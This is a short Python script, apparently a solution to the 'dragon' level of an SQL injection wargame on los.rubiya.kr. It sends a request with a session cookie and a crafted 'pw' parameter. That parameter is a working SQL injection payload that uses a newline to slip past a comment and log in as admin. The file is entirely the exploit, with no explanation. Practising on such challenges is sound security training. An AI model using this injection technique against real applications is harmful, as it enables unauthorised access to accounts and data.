import requests

cookies = {"PHPSESSID": "93l88lha32uc2t2q2c3n1v37p7"}

url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php"

params = {"pw": "\n and pw='' or id='admin"}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)